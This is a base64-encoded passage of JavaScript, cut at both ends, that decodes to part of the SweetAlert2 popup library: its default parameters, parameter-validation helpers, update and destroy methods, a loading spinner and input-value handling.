bk1lc3NhZ2UpO1xuICAgIH1cbiAgICBjb25zdCBpbnB1dCA9IHRoaXMuZ2V0SW5wdXQoKTtcbiAgICBpZiAoaW5wdXQpIHtcbiAgICAgIGlucHV0LnJlbW92ZUF0dHJpYnV0ZSgnYXJpYS1pbnZhbGlkJyk7XG4gICAgICBpbnB1dC5yZW1vdmVBdHRyaWJ1dGUoJ2FyaWEtZGVzY3JpYmVkYnknKTtcbiAgICAgIHJlbW92ZUNsYXNzKGlucHV0LCBzd2FsQ2xhc3Nlcy5pbnB1dGVycm9yKTtcbiAgICB9XG4gIH1cblxuICBjb25zdCBkZWZhdWx0UGFyYW1zID0ge1xuICAgIHRpdGxlOiAnJyxcbiAgICB0aXRsZVRleHQ6ICcnLFxuICAgIHRleHQ6ICcnLFxuICAgIGh0bWw6ICcnLFxuICAgIGZvb3RlcjogJycsXG4gICAgaWNvbjogdW5kZWZpbmVkLFxuICAgIGljb25Db2xvcjogdW5kZWZpbmVkLFxuICAgIGljb25IdG1sOiB1bmRlZmluZWQsXG4gICAgdGVtcGxhdGU6IHVuZGVmaW5lZCxcbiAgICB0b2FzdDogZmFsc2UsXG4gICAgc2hvd0NsYXNzOiB7XG4gICAgICBwb3B1cDogJ3N3YWwyLXNob3cnLFxuICAgICAgYmFja2Ryb3A6ICdzd2FsMi1iYWNrZHJvcC1zaG93JyxcbiAgICAgIGljb246ICdzd2FsMi1pY29uLXNob3cnXG4gICAgfSxcbiAgICBoaWRlQ2xhc3M6IHtcbiAgICAgIHBvcHVwOiAnc3dhbDItaGlkZScsXG4gICAgICBiYWNrZHJvcDogJ3N3YWwyLWJhY2tkcm9wLWhpZGUnLFxuICAgICAgaWNvbjogJ3N3YWwyLWljb24taGlkZSdcbiAgICB9LFxuICAgIGN1c3RvbUNsYXNzOiB7fSxcbiAgICB0YXJnZXQ6ICdib2R5JyxcbiAgICBjb2xvcjogdW5kZWZpbmVkLFxuICAgIGJhY2tkcm9wOiB0cnVlLFxuICAgIGhlaWdodEF1dG86IHRydWUsXG4gICAgYWxsb3dPdXRzaWRlQ2xpY2s6IHRydWUsXG4gICAgYWxsb3dFc2NhcGVLZXk6IHRydWUsXG4gICAgYWxsb3dFbnRlcktleTogdHJ1ZSxcbiAgICBzdG9wS2V5ZG93blByb3BhZ2F0aW9uOiB0cnVlLFxuICAgIGtleWRvd25MaXN0ZW5lckNhcHR1cmU6IGZhbHNlLFxuICAgIHNob3dDb25maXJtQnV0dG9uOiB0cnVlLFxuICAgIHNob3dEZW55QnV0dG9uOiBmYWxzZSxcbiAgICBzaG93Q2FuY2VsQnV0dG9uOiBmYWxzZSxcbiAgICBwcmVDb25maXJtOiB1bmRlZmluZWQsXG4gICAgcHJlRGVueTogdW5kZWZpbmVkLFxuICAgIGNvbmZpcm1CdXR0b25UZXh0OiAnT0snLFxuICAgIGNvbmZpcm1CdXR0b25BcmlhTGFiZWw6ICcnLFxuICAgIGNvbmZpcm1CdXR0b25Db2xvcjogdW5kZWZpbmVkLFxuICAgIGRlbnlCdXR0b25UZXh0OiAnTm8nLFxuICAgIGRlbnlCdXR0b25BcmlhTGFiZWw6ICcnLFxuICAgIGRlbnlCdXR0b25Db2xvcjogdW5kZWZpbmVkLFxuICAgIGNhbmNlbEJ1dHRvblRleHQ6ICdDYW5jZWwnLFxuICAgIGNhbmNlbEJ1dHRvbkFyaWFMYWJlbDogJycsXG4gICAgY2FuY2VsQnV0dG9uQ29sb3I6IHVuZGVmaW5lZCxcbiAgICBidXR0b25zU3R5bGluZzogdHJ1ZSxcbiAgICByZXZlcnNlQnV0dG9uczogZmFsc2UsXG4gICAgZm9jdXNDb25maXJtOiB0cnVlLFxuICAgIGZvY3VzRGVueTogZmFsc2UsXG4gICAgZm9jdXNDYW5jZWw6IGZhbHNlLFxuICAgIHJldHVybkZvY3VzOiB0cnVlLFxuICAgIHNob3dDbG9zZUJ1dHRvbjogZmFsc2UsXG4gICAgY2xvc2VCdXR0b25IdG1sOiAnJnRpbWVzOycsXG4gICAgY2xvc2VCdXR0b25BcmlhTGFiZWw6ICdDbG9zZSB0aGlzIGRpYWxvZycsXG4gICAgbG9hZGVySHRtbDogJycsXG4gICAgc2hvd0xvYWRlck9uQ29uZmlybTogZmFsc2UsXG4gICAgc2hvd0xvYWRlck9uRGVueTogZmFsc2UsXG4gICAgaW1hZ2VVcmw6IHVuZGVmaW5lZCxcbiAgICBpbWFnZVdpZHRoOiB1bmRlZmluZWQsXG4gICAgaW1hZ2VIZWlnaHQ6IHVuZGVmaW5lZCxcbiAgICBpbWFnZUFsdDogJycsXG4gICAgdGltZXI6IHVuZGVmaW5lZCxcbiAgICB0aW1lclByb2dyZXNzQmFyOiBmYWxzZSxcbiAgICB3aWR0aDogdW5kZWZpbmVkLFxuICAgIHBhZGRpbmc6IHVuZGVmaW5lZCxcbiAgICBiYWNrZ3JvdW5kOiB1bmRlZmluZWQsXG4gICAgaW5wdXQ6IHVuZGVmaW5lZCxcbiAgICBpbnB1dFBsYWNlaG9sZGVyOiAnJyxcbiAgICBpbnB1dExhYmVsOiAnJyxcbiAgICBpbnB1dFZhbHVlOiAnJyxcbiAgICBpbnB1dE9wdGlvbnM6IHt9LFxuICAgIGlucHV0QXV0b0ZvY3VzOiB0cnVlLFxuICAgIGlucHV0QXV0b1RyaW06IHRydWUsXG4gICAgaW5wdXRBdHRyaWJ1dGVzOiB7fSxcbiAgICBpbnB1dFZhbGlkYXRvcjogdW5kZWZpbmVkLFxuICAgIHJldHVybklucHV0VmFsdWVPbkRlbnk6IGZhbHNlLFxuICAgIHZhbGlkYXRpb25NZXNzYWdlOiB1bmRlZmluZWQsXG4gICAgZ3JvdzogZmFsc2UsXG4gICAgcG9zaXRpb246ICdjZW50ZXInLFxuICAgIHByb2dyZXNzU3RlcHM6IFtdLFxuICAgIGN1cnJlbnRQcm9ncmVzc1N0ZXA6IHVuZGVmaW5lZCxcbiAgICBwcm9ncmVzc1N0ZXBzRGlzdGFuY2U6IHVuZGVmaW5lZCxcbiAgICB3aWxsT3BlbjogdW5kZWZpbmVkLFxuICAgIGRpZE9wZW46IHVuZGVmaW5lZCxcbiAgICBkaWRSZW5kZXI6IHVuZGVmaW5lZCxcbiAgICB3aWxsQ2xvc2U6IHVuZGVmaW5lZCxcbiAgICBkaWRDbG9zZTogdW5kZWZpbmVkLFxuICAgIGRpZERlc3Ryb3k6IHVuZGVmaW5lZCxcbiAgICBzY3JvbGxiYXJQYWRkaW5nOiB0cnVlXG4gIH07XG4gIGNvbnN0IHVwZGF0YWJsZVBhcmFtcyA9IFsnYWxsb3dFc2NhcGVLZXknLCAnYWxsb3dPdXRzaWRlQ2xpY2snLCAnYmFja2dyb3VuZCcsICdidXR0b25zU3R5bGluZycsICdjYW5jZWxCdXR0b25BcmlhTGFiZWwnLCAnY2FuY2VsQnV0dG9uQ29sb3InLCAnY2FuY2VsQnV0dG9uVGV4dCcsICdjbG9zZUJ1dHRvbkFyaWFMYWJlbCcsICdjbG9zZUJ1dHRvbkh0bWwnLCAnY29sb3InLCAnY29uZmlybUJ1dHRvbkFyaWFMYWJlbCcsICdjb25maXJtQnV0dG9uQ29sb3InLCAnY29uZmlybUJ1dHRvblRleHQnLCAnY3VycmVudFByb2dyZXNzU3RlcCcsICdjdXN0b21DbGFzcycsICdkZW55QnV0dG9uQXJpYUxhYmVsJywgJ2RlbnlCdXR0b25Db2xvcicsICdkZW55QnV0dG9uVGV4dCcsICdkaWRDbG9zZScsICdkaWREZXN0cm95JywgJ2Zvb3RlcicsICdoaWRlQ2xhc3MnLCAnaHRtbCcsICdpY29uJywgJ2ljb25Db2xvcicsICdpY29uSHRtbCcsICdpbWFnZUFsdCcsICdpbWFnZUhlaWdodCcsICdpbWFnZVVybCcsICdpbWFnZVdpZHRoJywgJ3ByZUNvbmZpcm0nLCAncHJlRGVueScsICdwcm9ncmVzc1N0ZXBzJywgJ3JldHVybkZvY3VzJywgJ3JldmVyc2VCdXR0b25zJywgJ3Nob3dDYW5jZWxCdXR0b24nLCAnc2hvd0Nsb3NlQnV0dG9uJywgJ3Nob3dDb25maXJtQnV0dG9uJywgJ3Nob3dEZW55QnV0dG9uJywgJ3RleHQnLCAndGl0bGUnLCAndGl0bGVUZXh0JywgJ3dpbGxDbG9zZSddO1xuICBjb25zdCBkZXByZWNhdGVkUGFyYW1zID0ge307XG4gIGNvbnN0IHRvYXN0SW5jb21wYXRpYmxlUGFyYW1zID0gWydhbGxvd091dHNpZGVDbGljaycsICdhbGxvd0VudGVyS2V5JywgJ2JhY2tkcm9wJywgJ2ZvY3VzQ29uZmlybScsICdmb2N1c0RlbnknLCAnZm9jdXNDYW5jZWwnLCAncmV0dXJuRm9jdXMnLCAnaGVpZ2h0QXV0bycsICdrZXlkb3duTGlzdGVuZXJDYXB0dXJlJ107XG5cbiAgLyoqXG4gICAqIElzIHZhbGlkIHBhcmFtZXRlclxuICAgKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gcGFyYW1OYW1lXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgY29uc3QgaXNWYWxpZFBhcmFtZXRlciA9IHBhcmFtTmFtZSA9PiB7XG4gICAgcmV0dXJuIE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbChkZWZhdWx0UGFyYW1zLCBwYXJhbU5hbWUpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBJcyB2YWxpZCBwYXJhbWV0ZXIgZm9yIFN3YWwudXBkYXRlKCkgbWV0aG9kXG4gICAqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBwYXJhbU5hbWVcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBpc1VwZGF0YWJsZVBhcmFtZXRlciA9IHBhcmFtTmFtZSA9PiB7XG4gICAgcmV0dXJuIHVwZGF0YWJsZVBhcmFtcy5pbmRleE9mKHBhcmFtTmFtZSkgIT09IC0xO1xuICB9O1xuXG4gIC8qKlxuICAgKiBJcyBkZXByZWNhdGVkIHBhcmFtZXRlclxuICAgKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gcGFyYW1OYW1lXG4gICAqIEByZXR1cm5zIHtzdHJpbmcgfCB1bmRlZmluZWR9XG4gICAqL1xuICBjb25zdCBpc0RlcHJlY2F0ZWRQYXJhbWV0ZXIgPSBwYXJhbU5hbWUgPT4ge1xuICAgIHJldHVybiBkZXByZWNhdGVkUGFyYW1zW3BhcmFtTmFtZV07XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBwYXJhbVxuICAgKi9cbiAgY29uc3QgY2hlY2tJZlBhcmFtSXNWYWxpZCA9IHBhcmFtID0+IHtcbiAgICBpZiAoIWlzVmFsaWRQYXJhbWV0ZXIocGFyYW0pKSB7XG4gICAgICB3YXJuKGBVbmtub3duIHBhcmFtZXRlciBcIiR7cGFyYW19XCJgKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBwYXJhbVxuICAgKi9cbiAgY29uc3QgY2hlY2tJZlRvYXN0UGFyYW1Jc1ZhbGlkID0gcGFyYW0gPT4ge1xuICAgIGlmICh0b2FzdEluY29tcGF0aWJsZVBhcmFtcy5pbmNsdWRlcyhwYXJhbSkpIHtcbiAgICAgIHdhcm4oYFRoZSBwYXJhbWV0ZXIgXCIke3BhcmFtfVwiIGlzIGluY29tcGF0aWJsZSB3aXRoIHRvYXN0c2ApO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtzdHJpbmd9IHBhcmFtXG4gICAqL1xuICBjb25zdCBjaGVja0lmUGFyYW1Jc0RlcHJlY2F0ZWQgPSBwYXJhbSA9PiB7XG4gICAgaWYgKGlzRGVwcmVjYXRlZFBhcmFtZXRlcihwYXJhbSkpIHtcbiAgICAgIHdhcm5BYm91dERlcHJlY2F0aW9uKHBhcmFtLCBpc0RlcHJlY2F0ZWRQYXJhbWV0ZXIocGFyYW0pKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIFNob3cgcmVsZXZhbnQgd2FybmluZ3MgZm9yIGdpdmVuIHBhcmFtc1xuICAgKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IHNob3dXYXJuaW5nc0ZvclBhcmFtcyA9IHBhcmFtcyA9PiB7XG4gICAgaWYgKHBhcmFtcy5iYWNrZHJvcCA9PT0gZmFsc2UgJiYgcGFyYW1zLmFsbG93T3V0c2lkZUNsaWNrKSB7XG4gICAgICB3YXJuKCdcImFsbG93T3V0c2lkZUNsaWNrXCIgcGFyYW1ldGVyIHJlcXVpcmVzIGBiYWNrZHJvcGAgcGFyYW1ldGVyIHRvIGJlIHNldCB0byBgdHJ1ZWAnKTtcbiAgICB9XG4gICAgZm9yIChjb25zdCBwYXJhbSBpbiBwYXJhbXMpIHtcbiAgICAgIGNoZWNrSWZQYXJhbUlzVmFsaWQocGFyYW0pO1xuICAgICAgaWYgKHBhcmFtcy50b2FzdCkge1xuICAgICAgICBjaGVja0lmVG9hc3RQYXJhbUlzVmFsaWQocGFyYW0pO1xuICAgICAgfVxuICAgICAgY2hlY2tJZlBhcmFtSXNEZXByZWNhdGVkKHBhcmFtKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIFVwZGF0ZXMgcG9wdXAgcGFyYW1ldGVycy5cbiAgICpcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBmdW5jdGlvbiB1cGRhdGUocGFyYW1zKSB7XG4gICAgY29uc3QgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldCh0aGlzKTtcbiAgICBpZiAoIXBvcHVwIHx8IGhhc0NsYXNzKHBvcHVwLCBpbm5lclBhcmFtcy5oaWRlQ2xhc3MucG9wdXApKSB7XG4gICAgICB3YXJuKGBZb3UncmUgdHJ5aW5nIHRvIHVwZGF0ZSB0aGUgY2xvc2VkIG9yIGNsb3NpbmcgcG9wdXAsIHRoYXQgd29uJ3Qgd29yay4gVXNlIHRoZSB1cGRhdGUoKSBtZXRob2QgaW4gcHJlQ29uZmlybSBwYXJhbWV0ZXIgb3Igc2hvdyBhIG5ldyBwb3B1cC5gKTtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgY29uc3QgdmFsaWRVcGRhdGFibGVQYXJhbXMgPSBmaWx0ZXJWYWxpZFBhcmFtcyhwYXJhbXMpO1xuICAgIGNvbnN0IHVwZGF0ZWRQYXJhbXMgPSBPYmplY3QuYXNzaWduKHt9LCBpbm5lclBhcmFtcywgdmFsaWRVcGRhdGFibGVQYXJhbXMpO1xuICAgIHJlbmRlcih0aGlzLCB1cGRhdGVkUGFyYW1zKTtcbiAgICBwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuc2V0KHRoaXMsIHVwZGF0ZWRQYXJhbXMpO1xuICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKHRoaXMsIHtcbiAgICAgIHBhcmFtczoge1xuICAgICAgICB2YWx1ZTogT2JqZWN0LmFzc2lnbih7fSwgdGhpcy5wYXJhbXMsIHBhcmFtcyksXG4gICAgICAgIHdyaXRhYmxlOiBmYWxzZSxcbiAgICAgICAgZW51bWVyYWJsZTogdHJ1ZVxuICAgICAgfVxuICAgIH0pO1xuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKiBAcmV0dXJucyB7U3dlZXRBbGVydE9wdGlvbnN9XG4gICAqL1xuICBjb25zdCBmaWx0ZXJWYWxpZFBhcmFtcyA9IHBhcmFtcyA9PiB7XG4gICAgY29uc3QgdmFsaWRVcGRhdGFibGVQYXJhbXMgPSB7fTtcbiAgICBPYmplY3Qua2V5cyhwYXJhbXMpLmZvckVhY2gocGFyYW0gPT4ge1xuICAgICAgaWYgKGlzVXBkYXRhYmxlUGFyYW1ldGVyKHBhcmFtKSkge1xuICAgICAgICB2YWxpZFVwZGF0YWJsZVBhcmFtc1twYXJhbV0gPSBwYXJhbXNbcGFyYW1dO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgd2FybihgSW52YWxpZCBwYXJhbWV0ZXIgdG8gdXBkYXRlOiAke3BhcmFtfWApO1xuICAgICAgfVxuICAgIH0pO1xuICAgIHJldHVybiB2YWxpZFVwZGF0YWJsZVBhcmFtcztcbiAgfTtcblxuICAvKipcbiAgICogRGlzcG9zZSB0aGUgY3VycmVudCBTd2VldEFsZXJ0MiBpbnN0YW5jZVxuICAgKi9cbiAgZnVuY3Rpb24gX2Rlc3Ryb3koKSB7XG4gICAgY29uc3QgZG9tQ2FjaGUgPSBwcml2YXRlUHJvcHMuZG9tQ2FjaGUuZ2V0KHRoaXMpO1xuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldCh0aGlzKTtcbiAgICBpZiAoIWlubmVyUGFyYW1zKSB7XG4gICAgICBkaXNwb3NlV2Vha01hcHModGhpcyk7IC8vIFRoZSBXZWFrTWFwcyBtaWdodCBoYXZlIGJlZW4gcGFydGx5IGRlc3Ryb3llZCwgd2UgbXVzdCByZWNhbGwgaXQgdG8gZGlzcG9zZSBhbnkgcmVtYWluaW5nIFdlYWtNYXBzICMyMzM1XG4gICAgICByZXR1cm47IC8vIFRoaXMgaW5zdGFuY2UgaGFzIGFscmVhZHkgYmVlbiBkZXN0cm95ZWRcbiAgICB9XG5cbiAgICAvLyBDaGVjayBpZiB0aGVyZSBpcyBhbm90aGVyIFN3YWwgY2xvc2luZ1xuICAgIGlmIChkb21DYWNoZS5wb3B1cCAmJiBnbG9iYWxTdGF0ZS5zd2FsQ2xvc2VFdmVudEZpbmlzaGVkQ2FsbGJhY2spIHtcbiAgICAgIGdsb2JhbFN0YXRlLnN3YWxDbG9zZUV2ZW50RmluaXNoZWRDYWxsYmFjaygpO1xuICAgICAgZGVsZXRlIGdsb2JhbFN0YXRlLnN3YWxDbG9zZUV2ZW50RmluaXNoZWRDYWxsYmFjaztcbiAgICB9XG4gICAgaWYgKHR5cGVvZiBpbm5lclBhcmFtcy5kaWREZXN0cm95ID09PSAnZnVuY3Rpb24nKSB7XG4gICAgICBpbm5lclBhcmFtcy5kaWREZXN0cm95KCk7XG4gICAgfVxuICAgIGRpc3Bvc2VTd2FsKHRoaXMpO1xuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqL1xuICBjb25zdCBkaXNwb3NlU3dhbCA9IGluc3RhbmNlID0+IHtcbiAgICBkaXNwb3NlV2Vha01hcHMoaW5zdGFuY2UpO1xuICAgIC8vIFVuc2V0IHRoaXMucGFyYW1zIHNvIEdDIHdpbGwgZGlzcG9zZSBpdCAoIzE1NjkpXG4gICAgLy8gQHRzLWlnbm9yZVxuICAgIGRlbGV0ZSBpbnN0YW5jZS5wYXJhbXM7XG4gICAgLy8gVW5zZXQgZ2xvYmFsU3RhdGUgcHJvcHMgc28gR0Mgd2lsbCBkaXNwb3NlIGdsb2JhbFN0YXRlICgjMTU2OSlcbiAgICBkZWxldGUgZ2xvYmFsU3RhdGUua2V5ZG93bkhhbmRsZXI7XG4gICAgZGVsZXRlIGdsb2JhbFN0YXRlLmtleWRvd25UYXJnZXQ7XG4gICAgLy8gVW5zZXQgY3VycmVudEluc3RhbmNlXG4gICAgZGVsZXRlIGdsb2JhbFN0YXRlLmN1cnJlbnRJbnN0YW5jZTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICovXG4gIGNvbnN0IGRpc3Bvc2VXZWFrTWFwcyA9IGluc3RhbmNlID0+IHtcbiAgICAvLyBJZiB0aGUgY3VycmVudCBpbnN0YW5jZSBpcyBhd2FpdGluZyBhIHByb21pc2UgcmVzdWx0LCB3ZSBrZWVwIHRoZSBwcml2YXRlTWV0aG9kcyB0byBjYWxsIHRoZW0gb25jZSB0aGUgcHJvbWlzZSByZXN1bHQgaXMgcmV0cmlldmVkICMyMzM1XG4gICAgLy8gQHRzLWlnbm9yZVxuICAgIGlmIChpbnN0YW5jZS5pc0F3YWl0aW5nUHJvbWlzZSgpKSB7XG4gICAgICB1bnNldFdlYWtNYXBzKHByaXZhdGVQcm9wcywgaW5zdGFuY2UpO1xuICAgICAgcHJpdmF0ZVByb3BzLmF3YWl0aW5nUHJvbWlzZS5zZXQoaW5zdGFuY2UsIHRydWUpO1xuICAgIH0gZWxzZSB7XG4gICAgICB1bnNldFdlYWtNYXBzKHByaXZhdGVNZXRob2RzLCBpbnN0YW5jZSk7XG4gICAgICB1bnNldFdlYWtNYXBzKHByaXZhdGVQcm9wcywgaW5zdGFuY2UpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtvYmplY3R9IG9ialxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKi9cbiAgY29uc3QgdW5zZXRXZWFrTWFwcyA9IChvYmosIGluc3RhbmNlKSA9PiB7XG4gICAgZm9yIChjb25zdCBpIGluIG9iaikge1xuICAgICAgb2JqW2ldLmRlbGV0ZShpbnN0YW5jZSk7XG4gICAgfVxuICB9O1xuXG4gIHZhciBpbnN0YW5jZU1ldGhvZHMgPSAvKiNfX1BVUkVfXyovT2JqZWN0LmZyZWV6ZSh7XG4gICAgX19wcm90b19fOiBudWxsLFxuICAgIF9kZXN0cm95OiBfZGVzdHJveSxcbiAgICBjbG9zZTogY2xvc2UsXG4gICAgY2xvc2VNb2RhbDogY2xvc2UsXG4gICAgY2xvc2VQb3B1cDogY2xvc2UsXG4gICAgY2xvc2VUb2FzdDogY2xvc2UsXG4gICAgZGlzYWJsZUJ1dHRvbnM6IGRpc2FibGVCdXR0b25zLFxuICAgIGRpc2FibGVJbnB1dDogZGlzYWJsZUlucHV0LFxuICAgIGRpc2FibGVMb2FkaW5nOiBoaWRlTG9hZGluZyxcbiAgICBlbmFibGVCdXR0b25zOiBlbmFibGVCdXR0b25zLFxuICAgIGVuYWJsZUlucHV0OiBlbmFibGVJbnB1dCxcbiAgICBnZXRJbnB1dDogZ2V0SW5wdXQsXG4gICAgaGFuZGxlQXdhaXRpbmdQcm9taXNlOiBoYW5kbGVBd2FpdGluZ1Byb21pc2UsXG4gICAgaGlkZUxvYWRpbmc6IGhpZGVMb2FkaW5nLFxuICAgIGlzQXdhaXRpbmdQcm9taXNlOiBpc0F3YWl0aW5nUHJvbWlzZSxcbiAgICByZWplY3RQcm9taXNlOiByZWplY3RQcm9taXNlLFxuICAgIHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2U6IHJlc2V0VmFsaWRhdGlvbk1lc3NhZ2UsXG4gICAgc2hvd1ZhbGlkYXRpb25NZXNzYWdlOiBzaG93VmFsaWRhdGlvbk1lc3NhZ2UsXG4gICAgdXBkYXRlOiB1cGRhdGVcbiAgfSk7XG5cbiAgLyoqXG4gICAqIFNob3dzIGxvYWRlciAoc3Bpbm5lciksIHRoaXMgaXMgdXNlZnVsIHdpdGggQUpBWCByZXF1ZXN0cy5cbiAgICogQnkgZGVmYXVsdCB0aGUgbG9hZGVyIGJlIHNob3duIGluc3RlYWQgb2YgdGhlIFwiQ29uZmlybVwiIGJ1dHRvbi5cbiAgICpcbiAgICogQHBhcmFtIHtIVE1MQnV0dG9uRWxlbWVudH0gW2J1dHRvblRvUmVwbGFjZV1cbiAgICovXG4gIGNvbnN0IHNob3dMb2FkaW5nID0gYnV0dG9uVG9SZXBsYWNlID0+IHtcbiAgICBsZXQgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIGlmICghcG9wdXApIHtcbiAgICAgIG5ldyBTd2FsKCk7IC8vIGVzbGludC1kaXNhYmxlLWxpbmUgbm8tbmV3XG4gICAgfVxuXG4gICAgcG9wdXAgPSBnZXRQb3B1cCgpO1xuICAgIGNvbnN0IGxvYWRlciA9IGdldExvYWRlcigpO1xuICAgIGlmIChpc1RvYXN0KCkpIHtcbiAgICAgIGhpZGUoZ2V0SWNvbigpKTtcbiAgICB9IGVsc2Uge1xuICAgICAgcmVwbGFjZUJ1dHRvbihwb3B1cCwgYnV0dG9uVG9SZXBsYWNlKTtcbiAgICB9XG4gICAgc2hvdyhsb2FkZXIpO1xuICAgIHBvcHVwLnNldEF0dHJpYnV0ZSgnZGF0YS1sb2FkaW5nJywgJ3RydWUnKTtcbiAgICBwb3B1cC5zZXRBdHRyaWJ1dGUoJ2FyaWEtYnVzeScsICd0cnVlJyk7XG4gICAgcG9wdXAuZm9jdXMoKTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gcG9wdXBcbiAgICogQHBhcmFtIHtIVE1MQnV0dG9uRWxlbWVudH0gW2J1dHRvblRvUmVwbGFjZV1cbiAgICovXG4gIGNvbnN0IHJlcGxhY2VCdXR0b24gPSAocG9wdXAsIGJ1dHRvblRvUmVwbGFjZSkgPT4ge1xuICAgIGNvbnN0IGFjdGlvbnMgPSBnZXRBY3Rpb25zKCk7XG4gICAgY29uc3QgbG9hZGVyID0gZ2V0TG9hZGVyKCk7XG4gICAgaWYgKCFidXR0b25Ub1JlcGxhY2UgJiYgaXNWaXNpYmxlJDEoZ2V0Q29uZmlybUJ1dHRvbigpKSkge1xuICAgICAgYnV0dG9uVG9SZXBsYWNlID0gZ2V0Q29uZmlybUJ1dHRvbigpO1xuICAgIH1cbiAgICBzaG93KGFjdGlvbnMpO1xuICAgIGlmIChidXR0b25Ub1JlcGxhY2UpIHtcbiAgICAgIGhpZGUoYnV0dG9uVG9SZXBsYWNlKTtcbiAgICAgIGxvYWRlci5zZXRBdHRyaWJ1dGUoJ2RhdGEtYnV0dG9uLXRvLXJlcGxhY2UnLCBidXR0b25Ub1JlcGxhY2UuY2xhc3NOYW1lKTtcbiAgICB9XG4gICAgbG9hZGVyLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGxvYWRlciwgYnV0dG9uVG9SZXBsYWNlKTtcbiAgICBhZGRDbGFzcyhbcG9wdXAsIGFjdGlvbnNdLCBzd2FsQ2xhc3Nlcy5sb2FkaW5nKTtcbiAgfTtcblxuICAvKipcbiAgICogQHR5cGVkZWYgeyBzdHJpbmcgfCBudW1iZXIgfCBib29sZWFuIH0gSW5wdXRWYWx1ZVxuICAgKi9cblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBoYW5kbGVJbnB1dE9wdGlvbnNBbmRWYWx1ZSA9IChpbnN0YW5jZSwgcGFyYW1zKSA9PiB7XG4gICAgaWYgKHBhcmFtcy5pbnB1dCA9PT0gJ3NlbGVjdCcgfHwgcGFyYW1zLmlucHV0ID09PSAncmFkaW8nKSB7XG4gICAgICBoYW5kbGVJbnB1dE9wdGlvbnMoaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgfSBlbHNlIGlmIChbJ3RleHQnLCAnZW1haWwnLCAnbnVtYmVyJywgJ3RlbCcsICd0ZXh0YXJlYSddLmluY2x1ZGVzKHBhcmFtcy5pbnB1dCkgJiYgKGhhc1RvUHJvbWlzZUZuKHBhcmFtcy5pbnB1dFZhbHVlKSB8fCBpc1Byb21pc2UocGFyYW1zLmlucHV0VmFsdWUpKSkge1xuICAgICAgc2hvd0xvYWRpbmcoZ2V0Q29uZmlybUJ1dHRvbigpKTtcbiAgICAgIGhhbmRsZUlucHV0VmFsdWUoaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBpbm5lclBhcmFtc1xuICAgKiBAcmV0dXJucyB7c3RyaW5nIHwgbnVtYmVyIHwgRmlsZSB8IEZpbGVMaXN0IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldElucHV0VmFsdWUgPSAoaW5zdGFuY2UsIGlubmVyUGFyYW1zKSA9PiB7XG4gICAgY29uc3QgaW5wdXQgPSBpbnN0YW5jZS5nZXRJbnB1dCgpO1xuICAgIGlmICghaW5wdXQpIHtcbiAgICAgIHJldHVybiBudWxsO1xuICAgIH1cbiAgICBzd2l0Y2ggKGlubmVyUGFyYW1zLmlucHV0KSB7XG4gICAgICBjYXNlICdjaGVja2JveCc6XG4gICAgICAgIHJldHVybiBnZXRDaGVja2JveFZhbHVlKGlucHV0KTtcbiAgICAgIGNhc2UgJ3JhZGlvJzpcbiAgICAgICAgcmV0dXJuIGdldFJhZGlvVmFsdWUoaW5wdXQpO1xuICAgICAgY2FzZSAnZmlsZSc6XG4gICAgICAgIHJldHVybiBnZXRGaWxlVmFsdWUoaW5wdXQpO1xuICAgICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIGlubmVyUGFyYW1zLmlucHV0QXV0b1RyaW0gPyBpbnB1dC52YWx1ZS50cmltKCkgOiBpbnB1dC52YWx1ZTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTElucHV